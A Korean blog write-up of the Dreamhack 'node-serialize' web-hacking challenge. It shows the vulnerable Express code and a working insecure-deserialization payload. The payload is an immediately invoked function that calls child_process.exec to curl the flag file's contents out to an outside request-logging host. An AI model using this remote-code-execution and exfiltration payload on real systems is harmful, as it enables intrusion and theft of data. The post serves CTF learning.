---
title: (42) Dreamhack node-serialize 문제 풀이
date: 2024-02-27 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
Node로 구현된 간단한 서버입니다. 취약점을 찾아 Flag를 획득하세요!
Flag는 `/app/flag` 에 있습니다. ( 플래그형식은 `FLAG{}` 입니다. )

## 문제 풀이
접속해보면 사이트에 별거 없고 문자열만 하나 보입니다.  
바로 코드를 확인해 보겠습니다.
```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const serialize = require('node-serialize');
const app = express();
app.use(cookieParser())

app.get('/', (req, res) => {
    if (req.cookies.profile) {
        let str = new Buffer.from(req.cookies.profile, 'base64').toString();

        // Special Filter For You :)

        let obj = serialize.unserialize(str);
        if (obj) {
            res.send("Set Cookie Success!");
        }
    } else {
        res.cookie('profile', "eyJ1c2VybmFtZSI6ICJndWVzdCIsImNvdW50cnkiOiAiS29yZWEifQ==", {
            maxAge: 900000,
            httpOnly: true
        });
        res.redirect('/');
    }

});

app.listen(5000);
```
코드도 이게 전부입니다.  
  
문제 이름처럼, unserialize과정에서 발생하는 취약점을 이용한 문제입니다.
### unserialize 취약점
함수를 포함한 객체를 직렬화 하면
```
{"key":"_$$ND_FUNC$$_function() {}"}
```
의 형태로 출력됩니다. 이때 아래와 같이 실행하고자 하는 함수 마지막에 `()`을 추가하면
```
{"key":"_$$ND_FUNC$$_function() { console.log('Hello World!'); }()"}
```
위 문자열을 다시 역직렬화를 할 때 해당 함수를 실행시킬 수 있습니다.
<br>
  
우리는 `flag`를 읽어서 내부의 내용을 얻어야 합니다. 따라서 
```
{"hack":"_$$ND_FUNC$$_function() { require('child_process').exec('curl https://ksvbjlq.request.dreamhack.games?flag=$(cat flag)', () => {}); return true; }()"}
```
위와 `curl`을 이용해서 flag파일을 읽고 dreamhack tools로 보내도록 만들어 주었습니다.
이를 base64로 인코딩하여 `profile` 쿠키에 넣어주고 페이지를 새로고침하면
![](https://kyuyeop.github.io/assets/img/post/42/1.png)
위와 같이 `Set Cookie Success!`가 출력됩니다.  
이후 dreamhack tools로 가서 접속 로그를 확인해보면
![](https://kyuyeop.github.io/assets/img/post/42/2.png)
이렇게 FLAG가 확인할 수 있습니다.  
조건에 맞게 `{}`를 추가해 주면 flag를 구할 수 있습니다.
{% endraw %}